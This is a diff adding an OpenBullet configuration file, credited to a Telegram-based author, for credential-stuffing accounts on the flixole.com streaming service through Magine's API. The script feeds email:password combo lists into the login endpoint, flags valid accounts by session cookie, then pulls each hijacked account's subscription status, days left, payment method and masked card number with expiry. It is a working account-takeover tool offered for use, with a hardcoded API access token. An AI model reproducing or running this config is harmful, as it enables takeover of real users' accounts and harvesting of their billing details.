@@ -1,0 +1,159 @@
+[SETTINGS]
+{
+  "Name": "flixole.com",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2021-09-25T20:13:59.9431406+03:30",
+  "AdditionalInfo": "https://t.me/Hogo_Victor",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor | Telegram Channel: @Open_Bullet_Config",
+      "VariableName": "",
+      "Id": 2146263708
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://client-api.magine.com/api/login/v2/auth/email" 
+  CONTENT "{\"identity\":\"<USER>\",\"accessKey\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: client-api.magine.com" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: template/506 CFNetwork/1312 Darwin/21.0.0" 
+  HEADER "Magine-Accesstoken: 6845a85f-0ce1-4ba9-a0a7-cdbfecf71cf6" 
+  HEADER "Accept-Language: en-US;q=1.0, *;q=0.1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" EqualTo "401" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES(mg_session_id)>" Exists 
+
+#Post REQUEST POST "https://client-api.magine.com/api/apiql/v2" 
+  CONTENT "{\"query\":\"query getEntitledOffers {\\\\n  viewer {\\\\n    id: magineId\\\\n    entitlements {\\\\n      edges {\\\\n        node {\\\\n          __typename\\\\n          offer {\\\\n            ...OfferFragment\\\\n          }\\\\n          purchasedAt\\\\n          ... on EntitlementSubscribeType {\\\\n            status\\\\n            entitledUntil\\\\n            trialUntil\\\\n          }\\\\n        }\\\\n      }\\\\n    }\\\\n\\\\n    subscriptions {\\\\n      edges {\\\\n        node {\\\\n          failedRenewals\\\\n          offerId\\\\n          promoCode {\\\\n            code\\\\n            expiry\\\\n            remaining\\\\n          }\\\\n          billing {\\\\n            price {\\\\n              netPrice\\\\n              grossPrice\\\\n              currency\\\\n            }\\\\n          }\\\\n        }\\\\n      }\\\\n    }\\\\n  }\\\\n}\\\\n\\\\nfragment OfferFragment on OfferInterfaceType {\\\\n  __typename\\\\n  id\\\\n  title\\\\n  usps\\\\n\\\\n  ... on SubscribeType {\\\\n    priceInCents\\\\n    currency\\\\n    recurringPeriod {\\\\n      length\\\\n      unit\\\\n    }\\\\n  }\\\\n\\\\n  ... on BuyType {\\\\n    priceInCents\\\\n    currency\\\\n  }\\\\n\\\\n  ... on PassType {\\\\n    priceInCents\\\\n    currency\\\\n  }\\\\n\\\\n  ... on RentType {\\\\n    priceInCents\\\\n    currency\\\\n  }\\\\n}\\\\n\",\"variables\":{}}" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "Host: client-api.magine.com" 
+  HEADER "Content-Length: 1163" 
+  HEADER "Sec-Ch-Ua: \"Chromium\";v=\"93\", \" Not;A Brand\";v=\"99\"" 
+  HEADER "Magine-Accesstoken: 6845a85f-0ce1-4ba9-a0a7-cdbfecf71cf6" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "Authorization: Bearer <COOKIES(mg_session_id)>" 
+  HEADER "Accept-Language: es" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://ver.flixole.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://ver.flixole.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Connection: close" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "offerId" 
+
+IF "<SOURCE>" Contains "expiry"
+
+#expireDate PARSE "<SOURCE>" LR "expiry\":\"" "T" CreateEmpty=FALSE -> CAP "expireDate" 
+
+ELSE
+
+#expireDate PARSE "<SOURCE>" LR "entitledUntil\":\"" "T" CreateEmpty=FALSE -> CAP "expireDate" 
+
+ENDIF
+
+#unix FUNCTION DateToUnixTime "yyyy-MM-dd" "<expireDate>" -> VAR "unix" 
+
+#current FUNCTION CurrentUnixTime -> VAR "current" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<current>" GreaterThan "<unix>" 
+
+#compute FUNCTION Compute "(<unix>-<current>)/86400" -> VAR "compute" 
+
+#daysLeft FUNCTION Round "<compute>" -> CAP "daysLeft" 
+
+#Get REQUEST GET "https://client-api.magine.com/api/billing/v2/users/<COOKIES(mg_user_id)>/payment_method" 
+  
+  HEADER "Host: client-api.magine.com" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Sec-Ch-Ua: \"Chromium\";v=\"93\", \" Not;A Brand\";v=\"99\"" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <COOKIES(mg_session_id)>" 
+  HEADER "Magine-Accesstoken: 6845a85f-0ce1-4ba9-a0a7-cdbfecf71cf6" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Origin: https://ver.flixole.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://ver.flixole.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: close" 
+
+#paymentMethod PARSE "<SOURCE>" JSON "method" CreateEmpty=FALSE -> CAP "paymentMethod" 
+
+#provider PARSE "<SOURCE>" JSON "provider" CreateEmpty=FALSE -> CAP "provider" 
+
+IF "<SOURCE>" Contains "ccMaskedNumber"
+
+#ccMaskedNumber PARSE "<SOURCE>" JSON "ccMaskedNumber" -> VAR "ccMaskedNumber" 
+
+#ccExpYear PARSE "<SOURCE>" JSON "ccExpYear" -> VAR "ccExpYear" 
+
+#ccExpMonth PARSE "<SOURCE>" JSON "ccExpMonth" -> VAR "ccExpMonth" 
+
+SET CAP "Card" "<ccMaskedNumber> | <ccExpMonth> | <ccExpYear>"
+ENDIF
+SET CAP "Config By" "@Hogo_Victor"
+SET CAP "Telegram Channel" "https://t.me/OpenBulletChannel"
+
